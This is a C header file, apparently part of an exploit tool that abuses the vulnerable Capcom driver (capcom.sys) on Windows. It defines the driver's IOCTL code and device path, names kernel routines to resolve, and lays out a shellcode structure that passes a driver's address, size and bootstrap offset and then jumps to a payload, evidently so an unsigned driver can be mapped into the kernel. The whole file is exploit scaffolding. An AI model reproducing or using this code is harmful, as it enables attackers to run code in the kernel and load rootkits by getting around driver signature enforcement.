#ifndef _HEFRSPLOIT_H_
#define _HEFRSPLOIT_H_

#define _CRT_SECURE_NO_WARNINGS
#define WINDOWS_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include "nt.h"

#define CAPCOM_DEVICE_TYPE          0xAA01
#define CAPCOM_FUNCTION             0xC11
#define CAPCOM_IO_CONTROL_CODE CTL_CODE(CAPCOM_DEVICE_TYPE, CAPCOM_FUNCTION, METHOD_BUFFERED, FILE_ANY_ACCESS) 

DECLARE_UNICODE_STRING(usExAllocatePoolWithTag, L"ExAllocatePoolWithTag");
DECLARE_UNICODE_STRING(usExFreePoolWithTag, L"ExFreePoolWithTag");
DECLARE_UNICODE_STRING(usRtlImageNtHeader, L"RtlImageNtHeader");
DECLARE_UNICODE_STRING(usRtlImageDirectoryEntryToData, L"RtlImageDirectoryEntryToData");
DECLARE_UNICODE_STRING(usRtlQueryModuleInformation, L"RtlQueryModuleInformation");
DECLARE_UNICODE_STRING(usPsCreateSystemThread, L"PsCreateSystemThread");
DECLARE_UNICODE_STRING(usIoCreateDriver, L"IoCreateDriver");
DECLARE_UNICODE_STRING(usZwClose, L"ZwClose");

const LPCWSTR CAPCOM_NAME = L"capcom";
const LPCWSTR CAPCOM_PATH = L"C:\\Windows\\System32\\Drivers\\capcom.sys";
const LPCWSTR CAPCOM_DEVICE_NAME = L"\\\\.\\Htsysm72FB";

#pragma pack(1)
typedef struct _SHELLCODE
{
    BYTE Sti;
    BYTE mov_rdx[2];        // mov rdx, driver address
    BYTE driver_addr[8];
    BYTE mov_r8[2];         // mov r8, driver size
    BYTE driver_size[4];
    BYTE mov_r9[2];         // mov r9, boostrap_offset
    BYTE BootstrapOffset[4];
    BYTE jmp[6];            // jump to Payload address
    void *PayloadAddress;
} SHELLCODE, *PSHELLCODE;

typedef struct _CAPCOM_EXPOIT_IO
{
    PVOID sc_addr;
    SHELLCODE sc;
}CAPCOM_EXPOIT_IO, *PCAPCOM_EXPOIT_IO;
#pragma pack()

#endif
